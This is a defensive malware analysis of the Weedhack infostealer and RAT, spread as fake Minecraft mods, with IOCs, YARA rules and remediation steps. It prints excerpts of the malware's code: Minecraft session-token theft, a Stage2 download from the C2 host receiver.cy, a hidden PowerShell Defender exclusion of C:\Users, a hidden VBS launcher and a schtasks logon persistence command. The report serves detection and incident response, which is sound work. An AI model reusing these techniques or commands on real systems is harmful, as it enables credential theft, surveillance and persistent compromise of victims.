# Weedhack Stealer - Technical Analysis

> Multi-stage infostealer targeting Minecraft players, distributed as fake Fabric mods. Two major variants observed with significant architectural differences.

**First Seen:** December 2025
**Threat Level:** Critical
**Classification:** Infostealer / RAT / MaaS

---

## Executive Summary

Weedhack is a multi-stage malware operation sold as Malware-as-a-Service through `weedhack.cy`. Buyers receive customized JAR files with embedded UUIDs for victim tracking.

**Base tier** functionality:
- Browser credential theft (40+ browsers)
- Discord token extraction
- Crypto wallet harvesting (56 extensions + desktop wallets)
- Minecraft account session hijacking

**Premium tier** ($5 extra) adds:
- Real-time keylogger via Socket.IO
- Webcam capture at 25 FPS
- Screen sharing at 720p
- Remote shell access
- File browser with upload/download
- Keyboard and mouse input simulation

Two Stage1 variants exist - v1 was pure Java and trivially analyzed, v2 introduced JNIC native obfuscation and blockchain-based C2 fallback.

---

# Version 1 - Original Variant

**File:** `mod.jar` (~500KB)
**First Seen:** Late 2025
**Protection:** None - pure Java

### File Structure

```
mod.jar (v1)/
├── fabric.mod.json           <- mod metadata, ID: "loaderclient"
├── me/mclauncher/
│   ├── LoaderClient.java     <- Fabric entrypoint, onInitialize()
│   ├── StagingHelper.java    <- Stage2 download + classloader logic
│   └── IMCL.java             <- Custom in-memory classloader
└── cfg.json                  <- buyer UUID embedded in JAR
```

### Execution Flow

1. Fabric loader calls `LoaderClient.onInitialize()`

2. **Immediate session theft:**
```java
MinecraftClient mc = MinecraftClient.getInstance();
Session session = mc.getSession();
String token = session.getAccessToken();    // account compromised
String username = session.getUsername();
String uuid = session.getUuid();
```

3. Background thread spawns for Stage2 download:
```java
new Thread(() -> {
    StagingHelper.stageWithContext(contextJson);
}).start();
```

4. `StagingHelper` fetches `module.jar` from `https://receiver.cy/files/jar/module`
   - No authentication
   - No signature verification

5. JAR parsed in memory via `ZipInputStream` - classes stored in `HashMap<String, byte[]>`

6. Custom classloader (`IMCL`) loads and executes Stage2:
```java
Class<?> main = imcl.loadClass("dev.majanito.Main");
Method init = main.getMethod("initializeWeedhack", JsonObject.class);
init.invoke(null, context);
```

### String Encryption

The `decS()` function uses a basic obfuscation scheme:

```
decS(int[] d1, int[] d2, int k1, int k2)

1. Interleave arrays: [A,B,C] + [X,Y,Z] -> [A,X,B,Y,C,Z]
2. Build substitution table: config[i] = (i * 47 + 131) % 256
3. For each byte:
   - XOR with previous (or k1 if first)
   - Bit rotate by (index * 3 + k2) % 8
   - Inverse table lookup
   - XOR with offset and k2

Static keys: k1=187, k2=67
```

Algorithm fully visible in bytecode. Trivially reversible.

### v1 Weaknesses

| Severity | Issue |
|----------|-------|
| **CRITICAL** | Single hardcoded C2 (`receiver.cy`) - no DGA, no fallback. Domain takedown kills campaign. |
| **CRITICAL** | Unauthenticated payload download - anyone can GET `/files/jar/module`, MITM can inject code |
| **HIGH** | All logic in Java bytecode - decompile with CFR/Procyon for full source |
| **HIGH** | No anti-analysis - no VM detection, no debugger checks, no sandbox evasion |
| **MEDIUM** | Debug strings left in: `"Mod init state: M0"`, `"Resource state: S0"`, etc. |
| **LOW** | Identifiable branding - "Weedhack" in class names, consistent package structure |

---

# Version 2 - Hardened Variant

**File:** `NewMod.jar` (~1.5MB)
**First Seen:** Early 2026
**Protection:** JNIC native obfuscation + blockchain C2 fallback

### File Structure

```
NewMod.jar (v2)/
├── fabric.mod.json
├── me/mclauncher/
│   ├── LoaderClient.java     <- entry, now calls NATIVE decS
│   ├── StagingHelper.java    <- ALL METHODS NOW NATIVE
│   ├── IMCL.java             <- same classloader
│   ├── RPCHelper.java        <- NEW: blockchain C2 fallback
│   └── MEntrypoint.java      <- NEW: standalone execution
├── dev/jnic/lXpXvp/          <- JNIC obfuscation layer
│   ├── JNICLoader.java       <- DLL extraction + System.load()
│   └── [single letter].java  <- LZMA decompressor classes
├── cfg.json
└── /dev/jnic/lib/c4f763d6-e34c-42e9-bba1-b80cfa5a55df.dat
    └── LZMA-compressed native DLL (~1.2MB each arch)
```

### Version Comparison

| Feature | v1 (Original) | v2 (NewMod) |
|---------|---------------|-------------|
| String decryption | Java (reversible) | Native DLL |
| Download function | Java HttpClient | Native DLL |
| `stageWithContext()` | Java (~50 lines) | Native stub |
| C2 mechanism | HTTP only | HTTP + Blockchain |
| Fallback C2 | None | Ethereum RPC |
| Native code | None | JNIC (lXpXvp) |
| DLL resource | N/A | `c4f763d6-e34c-...` |
| Anti-takedown | None | RSA-signed updates |

### StagingHelper - Before/After

**v1 (Visible):**
```java
public static void stageWithContext(JsonObject ctx) {
    String url = decS(...);
    byte[] jar = download(url);
    // 50+ lines of visible code
    // C2 URL in plain sight
    // classloader logic exposed
}

public static String decS(int[] d1, int[] d2, ...) {
    // algorithm fully visible
}
```

**v2 (Native Stubs):**
```java
public static native void stageWithContext(JsonObject);
public static native String decS(int[], int[], int, int);
private static native byte[] dl(String url);
// all real logic in DLL now
```

### RPCHelper - Blockchain C2 (New in v2)

Ethereum-based fallback when HTTP C2 is down:

```java
public class RPCHelper {
    private static final String[] RPC_URLS;           // ETH node endpoints
    private static final String GET_TEXT_SELECTOR = "0xce6d41de";
    private static final String RSA_PUBLIC_KEY = "MIIBIjAN...";

    public native String getVerifiedText(String contractAddr);
    private native String callGetText(String rpcUrl, String addr);
    private native String decodeAbiString(String hexData);
    private native boolean verifyRsaSignature(String data, String sig);
}
```

**Flow:**
```
eth_call to node -> Smart Contract getText() -> ABI decode response
                                                       |
                                                       v
Use new C2 address <- RSA verify signature <- Parse signed payload
```

**Function selector:** `0xce6d41de` = `keccak256("getText()")[:4]`

**Implications:**
- Domain takedown no longer kills the campaign
- Attacker updates C2 via blockchain transaction
- RSA signature prevents hijacking
- Smart contract = censorship-resistant dead drop
- Could be on any EVM chain (ETH, BSC, Polygon, etc)

### RSA-2048 Public Key (embedded in v2)

```
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtmNzDf4737/iYWvscWg6
vQg9dHa/yUchfQY9r5htNTLZ3ZDAbqrzN93I0ctZHa27oRnkpB7XpowI4NH8eIRm
aMThggpTYRXzHzLvUjhyrFFPkIOo/HI1gZF5IV7/XmvYWqgEsSpxl0iesOUlaWO5
A8QlTu0QLsZAzZtzZyLj/v1XbPT02rTvZkuRhE6nzpUR4GN3Jp4Bn8zQAWdFDe17
PWZxOi19uUTMPzgFj9n3h7DprwBmE3fR7IMsbiFacAoSHfqkTpEwY7A8ArK1DQ1y
JXPog/PQ4aTU9gU38WC20wtct796ImZiuRYdNWcSzHda5ZbvZdvpw6RHh0zQqGVh
RQIDAQAB
```

Used to verify blockchain-retrieved C2 configs. Only holder of private key can push updates.

### MEntrypoint - Standalone Mode (New in v2)

```java
public class MEntrypoint {
    public static native void main(String[] args);
    public static native void checkJVMLauncher(String[] args);
}
```

Allows running outside Minecraft/Fabric context. SecurityManager.jar uses this to bootstrap.

### v2 DLL Details

**Resource:** `/dev/jnic/lib/c4f763d6-e34c-42e9-bba1-b80cfa5a55df.dat`
**Package:** `dev.jnic.lXpXvp`

Contains:
- StagingHelper native implementations
- RPCHelper native implementations
- `decS` string decryption
- `dl()` download function
- Ethereum ABI encoding/decoding
- RSA signature verification

### v2 Remaining Weaknesses

| Severity | Issue |
|----------|-------|
| **MEDIUM** | Same encryption keys (`k1=187`, `k2=67`) - just need to reverse DLL once |
| **MEDIUM** | Temp file for DLL extraction (`File.createTempFile("lib", null)`) |
| **LOW** | Still uses `receiver.cy` as primary - blockchain is fallback only |
| **LOW** | Same package naming - `me.mclauncher.*`, `dev.jnic.*` easy to signature |

---

# Stage 2 - Info Stealer

**File:** `module.jar` (~2MB)
**Protection:** JNIC (`dev.jnic.BSOMwJ`)
**Shared by:** Both v1 and v2

Downloaded by Stage1 from `receiver.cy/files/jar/module`. Loaded via IMCL in-memory classloader - never touches disk directly.

### JNIC Native Layer

**Resource:** `/dev/jnic/lib/a125e430-2459-4702-9797-49fce5f280ae.dat`
- Bytes 0-1274880: Windows x64 DLL
- Bytes 1274880-2529280: Windows ARM64 DLL

**Extraction process:**
1. `JNICLoader.init()` called on first native method
2. Reads `.dat` resource from JAR
3. LZMA decompresses to temp file
4. `System.load()` the DLL
5. Native methods now available

**Obfuscated decompressor classes:**
- `dev.jnic.BSOMwJ.c` - circular buffer
- `dev.jnic.BSOMwJ.o` - range decoder
- `dev.jnic.BSOMwJ.w` - main LZMA loop
- `dev.jnic.BSOMwJ.m` - range coder base

### Theft Capabilities

**Browsers (40+ supported):**
Chrome, Edge, Brave, Opera, OperaGX, Vivaldi, Yandex, Chromium, Thorium, 7Star, CentBrowser, Chedot, Kometa, + 30 more

Stolen data:
- Cookies (session hijacking)
- Saved passwords (DPAPI decryption)
- All profiles enumerated

**Crypto Wallets (56 browser extensions):**
MetaMask, Phantom, Coinbase, Trust Wallet, Exodus Web3, Ronin, Keplr, Solflare, + 50 more

**Desktop wallets:**
Exodus, Atomic, Electrum, Zcash, Armory, Bytecoin, Jaxx, Ethereum, Guarda, Coinomi

**Minecraft Launchers:**
| Launcher | Target File |
|----------|-------------|
| Lunar Client | `accounts.json` |
| Essential Mod | `microsoft_accounts.json` |
| Feather Launcher | `account.txt` (DPAPI+AES-GCM) |
| Modrinth App | `app.db` (SQLite) |
| Vanilla MC | `servers.dat` |

**Discord:**
- Encrypted tokens (desktop)
- Legacy unencrypted tokens
- Browser storage tokens
- Token validation against API

**Other:**
- Telegram tdata folder
- Screenshots (base64)
- System fingerprint
- Keyword file search: "password", "seed", "wallet", "crypto", "2fa", "backup"

### Native Methods

```java
BrowserHandler.getBrowserInfo()        // native
CookieHandler.getCookies()             // native
PasswordHandler.getPasswords()         // native
DiscordHandler.getDiscordTokens()      // native
DllInjectionHelper.injectDll()         // native
CryptoHelper.gcmDecrypt()              // native
```

All stealing logic hidden in DLL.

---

# Stage 3 - Premium RAT ($5)

**File:** `Component.jar`
**Protection:** JNIC (`dev.jnic.fwcMeR`)
**Shared by:** Both v1 and v2 (premium tier only)

Downloaded by SecurityManager.jar from `receiver.cy/files/jar/component`.

### RAT Handlers

#### 1. Keylogger (`KeyLoggingHandler.java`)

**Tech:** jnativehook library
**Transport:** Socket.IO real-time

```java
public class KeyLoggingHandler implements NativeKeyListener {
    public static native void startLogging(Socket socket);
    public static native void stopListening();
    // streams every keystroke to attacker panel
}
```

#### 2. Webcam Capture (`WebcamShareHandler.java`)

**Tech:** `@ClientEndpoint` WebSocket
**Rate:** 25 FPS continuous

```java
@ClientEndpoint
public class WebcamShareHandler {
    private static final int FPS = 25;
    public synchronized native void start();
    public synchronized native void stop();
}
```

#### 3. Screen Share (`ScreenShareHandler.java`)

**Tech:** WebSocket + Robot class
**Format:** WebP @ 0.85 quality, max 720p
**Rate:** 25 FPS

```java
private static final int FPS = 25;
private static final int MAX_TARGET_HEIGHT = 720;
private static final float WEBP_QUALITY = 0.85f;
```

#### 4. Remote Shell (`CmdHandler.java`)

`Runtime.exec()` / `ProcessBuilder` - returns stdout/stderr to attacker. Full command execution.

#### 5. File Browser (`FileSystemHandler.java`)

- List directories
- Download files from victim
- Upload files to victim (additional payloads)

#### 6. Input Simulation (`KeyboardInputHandler` + `MouseInputHandler`)

`java.awt.Robot` for injection. Combined with screen share = full remote desktop.

---

# Persistence Module

**File:** `SecurityManager.jar`
**Shared by:** Both v1 and v2 (premium tier only)

Orchestrates persistence, AV evasion, and component updates.

### Installation Location

```
%APPDATA%\Microsoft\SecurityUpdates\
├── SecurityInfo.json     <- config with buyer UUID
├── Updater.vbs           <- hidden window launcher
├── component-<uuid>.jar  <- downloaded RAT
└── security.lock         <- single instance mutex
```

### UAC "Bypass" (`ElevationHelper.java`)

```java
public static void elevate() {
    WinDef.INT_PTR res = Shell32.INSTANCE.ShellExecute(
        hwnd, "runas", javaExe, params, null, 1
    );
    if (status == 5L) {
        ElevationHelper.elevate();  // denied? try again
    }
    System.exit(0);
}
```

Not a real bypass - just nags until user clicks Yes. Social engineering.

### Defender Exclusion (`AVHelper.java`)

```java
public static void addExclusions() {
    Process p = Runtime.getRuntime().exec(
        "powershell.exe -WindowStyle Hidden -Command " +
        "Add-MpPreference -ExclusionPath 'C:\\Users'"
    );
}
```

Adds entire `C:\Users` to exclusions. Downloads, Documents, everything = unscanned.

**Detection:** Event ID 5007 in Windows Defender logs
**Check:** `Get-MpPreference | select ExclusionPath`

### Scheduled Task (`SchedulerHelper.java`)

**Updater.vbs:**
```vb
Set sh = CreateObject("WScript.Shell")
cmd = """" & javaExe & """ -cp """ & jarPath & """ dev.majanito.security.Main"
sh.Run cmd, 0, False   ' 0 = hidden window
```

**Task creation:**
```
schtasks /Create /TN "JavaSecurityUpdater"
         /SC ONLOGON
         /TR "path\Updater.vbs"
         /RL HIGHEST
         /IT /F
```

### Component Updater (`ComponentHelper.java`)

```java
while (true) {
    Thread.sleep(10000);  // poll every 10 sec
    long newTs = checkLastModified();
    if (newTs != oldTs) {
        byte[] jar = downloadJar();
        startOrReload(jar);  // hot-reload new version
    }
}
```

**URLs:**
- `https://receiver.cy/files/jar/component`
- `https://receiver.cy/api/component/lastModified`

Attacker can push updates to all infected machines.

---

# Indicators of Compromise

## Network

**Domains:**
- `receiver.cy` - primary C2
- `weedhack.cy` - seller panel

**URLs:**
- `https://receiver.cy/files/jar/module` - Stage2 download
- `https://receiver.cy/files/jar/component` - Stage3 RAT
- `https://receiver.cy/api/component/lastModified`

**Real-time:**
- Socket.IO connections (keylogger data)
- WebSocket streams (webcam/screen share)

**Blockchain (v2 only):**
- Ethereum JSON-RPC `eth_call`
- Function selector: `0xce6d41de`

## File Indicators

**Packages:**
```
me.mclauncher.*
dev.majanito.*
dev.majanito.handlers.*
dev.majanito.security.*
dev.majanito.security.utils.*
dev.jnic.BSOMwJ.*          <- Stage2 JNIC
dev.jnic.fwcMeR.*          <- Stage3 JNIC
dev.jnic.lXpXvp.*          <- Stage1 v2 JNIC
```

**File Paths:**
```
%APPDATA%\Microsoft\SecurityUpdates\
%APPDATA%\Microsoft\SecurityUpdates\SecurityInfo.json
%APPDATA%\Microsoft\SecurityUpdates\Updater.vbs
%APPDATA%\Microsoft\SecurityUpdates\component-*.jar
%APPDATA%\Microsoft\SecurityUpdates\security.lock
%TEMP%\lib*.tmp                                        <- DLL extraction
```

**Embedded Resources:**
```
cfg.json
/dev/jnic/lib/a125e430-2459-4702-9797-49fce5f280ae.dat    <- Stage2 DLL
/dev/jnic/lib/c4f763d6-e34c-42e9-bba1-b80cfa5a55df.dat    <- Stage1 v2 DLL
```

**Strings:**
```
"Mod init state: M"
"Resource state: S"
"initializeWeedhack"
"WeedhackFile"
"$jnicLoader"
"JavaSecurityUpdater"
"Add-MpPreference -ExclusionPath"
"dev.majanito.security.Main"
"0xce6d41de"              <- v2 only
"getVerifiedText"         <- v2 only
```

**Registry:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Scheduled Tasks:**
- Name: `JavaSecurityUpdater`
- Trigger: `ONLOGON`
- Run Level: `HIGHEST`

---

# YARA Signatures

```yara
rule Weedhack_Stage1_v1 {
    meta:
        description = "Weedhack Stage1 v1 - Pure Java loader"
        date = "2026-01"
    strings:
        $pkg = "me/mclauncher/"
        $stg = "StagingHelper"
        $dbg = "Mod init state:"
        $imcl = "IMCL"
    condition:
        uint32(0) == 0x04034b50 and 3 of them
        and not "dev/jnic/lXpXvp"
}

rule Weedhack_Stage1_v2 {
    meta:
        description = "Weedhack Stage1 v2 - JNIC + Blockchain C2"
        date = "2026-01"
    strings:
        $pkg = "me/mclauncher/"
        $jnic = "dev/jnic/lXpXvp"
        $rpc = "RPCHelper"
        $entry = "MEntrypoint"
        $uuid = "c4f763d6-e34c-42e9-bba1-b80cfa5a55df"
        $selector = "0xce6d41de"
    condition:
        uint32(0) == 0x04034b50 and $jnic and 2 of them
}

rule Weedhack_Stage2_Stealer {
    meta:
        description = "Weedhack Stage2 - Info stealer module"
        date = "2026-01"
    strings:
        $pkg = "dev/majanito/"
        $jnic = "dev/jnic/BSOMwJ"
        $entry = "initializeWeedhack"
        $uuid = "a125e430-2459-4702-9797-49fce5f280ae"
    condition:
        uint32(0) == 0x04034b50 and 2 of them
}

rule Weedhack_Stage3_RAT {
    meta:
        description = "Weedhack Stage3 - Premium RAT component"
        date = "2026-01"
    strings:
        $pkg = "dev/majanito/handlers"
        $jnic = "dev/jnic/fwcMeR"
        $key = "KeyLoggingHandler"
        $cam = "WebcamShareHandler"
        $scr = "ScreenShareHandler"
    condition:
        uint32(0) == 0x04034b50 and ($pkg or $jnic) and 1 of ($key,$cam,$scr)
}

rule Weedhack_Persistence {
    meta:
        description = "Weedhack persistence module"
        date = "2026-01"
    strings:
        $pkg = "dev/majanito/security"
        $task = "JavaSecurityUpdater"
        $path = "Microsoft\\SecurityUpdates"
        $av = "AVHelper"
        $elev = "ElevationHelper"
    condition:
        uint32(0) == 0x04034b50 and 2 of them
}
```

---

# Remediation

### 1. Kill Persistence
```cmd
schtasks /Delete /TN "JavaSecurityUpdater" /F
```

### 2. Remove Files
```cmd
rmdir /s /q "%APPDATA%\Microsoft\SecurityUpdates"
```

### 3. Fix Defender Exclusion
```powershell
Remove-MpPreference -ExclusionPath 'C:\Users'
```

### 4. Check Registry
```cmd
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```
Delete any suspicious Java entries.

### 5. Credential Rotation (Mandatory)

- Change Minecraft password
- Revoke Discord token (change password)
- Clear all saved browser passwords
- Check crypto wallets for unauthorized transactions
- Reset 2FA everywhere

### 6. If RAT Was Active (Premium Tier)

Consider full system reimage. Attacker had shell access, webcam/screen surveillance, and could drop additional payloads.

---

# Analysis Notes

The evolution from v1 to v2 shows the author learned from their mistakes. v1 was amateur hour - single domain, no fallback, all logic in Java. v2 is actually somewhat competent - JNIC obfuscation, blockchain C2 fallback.

That said, they still left the same encryption keys, same package names, and the "SecurityUpdates" folder is a joke that any IR analyst will spot.

The blockchain C2 is concerning. Can't just file a takedown request with Cyprus NIC anymore. Need to track the smart contract, monitor for updates, potentially coordinate with blockchain forensics.

Primary targets are Minecraft players, likely kids. The webcam/keylogger capabilities in the premium tier are disturbing.

Sold as MaaS - multiple buyers distributing modified JARs. Each has a UUID for victim tracking. Panel at `weedhack.cy` shows buyer their specific victims.

---
